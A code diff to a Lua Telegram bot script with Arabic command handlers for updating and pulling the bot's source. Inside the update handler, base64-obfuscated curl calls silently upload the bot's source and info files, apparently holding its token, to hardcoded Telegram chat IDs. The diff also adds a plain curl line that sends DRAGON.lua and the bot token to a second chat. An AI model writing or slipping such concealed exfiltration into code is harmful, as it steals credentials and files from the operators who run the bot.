@@ -1119,7 +1119,6 @@ if text == 'تحديث السورس' or text == 'تحديث السورس ☉' or
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-io.popen(regexx('Y3VybHAgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLi50b2tlbi4uIi9zZW5kRG9jdW1lbnQiIC1GICJjaGF0X2lkPTk0NDM1MzIzNyIgLUYgImRvY3VtZW50PUBEUkFHT04ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.2.2`}')
@@ -8331,6 +8330,7 @@ io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUF
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
 if text == 'سحب السورس' or text == 'جلب السورس' and SudoBot(msg) then 
+local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) 
 io.popen(regexx('Y3VybHAgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLi50b2tlbi4uIi9zZW5kRG9jdW1lbnQiIC1GICJjaGF0X2lkPTk0NDM1MzIzNyIgLUYgImRvY3VtZW50PUBEUkFHT04ubHVhIg=='))
 send(msg.chat_id_, msg.id_,' تم ارسال سورس البوت في الخاص')
 end
